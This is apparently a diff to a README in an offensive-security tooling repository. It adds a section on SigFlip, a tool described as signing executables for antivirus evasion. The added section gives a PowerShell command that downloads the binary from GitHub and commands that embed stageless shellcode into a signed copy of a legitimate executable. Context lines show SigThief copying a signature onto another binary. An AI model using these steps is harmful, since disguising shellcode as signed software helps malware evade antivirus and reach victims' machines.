@@ -38,3 +38,28 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-E
 ```python   
 python Sigthief.py -i "sigcheck.exe" -t "prometheus.exe" -o "signed-prometheus.exe"
 ```
+
+<br />
+
+## SigFlip.exe
+
+|Binary Name|Description|Privileges|Notes|
+|---|---|---|---|
+|SigFlip|A tool to sign an Executable for AV Evasion.|User Land|[Author: @med0x2e](https://github.com/med0x2e/SigFlip)|
+
+**download script:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/SigFlip.exe" -OutFile "SigFlip.exe"
+```
+
+**execute:**
+```powershell 
+#Help
+.\SigFlip.exe -h
+
+#Sign original PE
+.\SigFlip.exe -b "original.exe" "Signed-original.exe"
+
+#build Signed Shellcode Executable { embebbed shellcode.bin on Signed-original.exe }
+.\SigFlip.exe -i "original.exe" "x64-stageless.bin" "Signed-original.exe"
+```
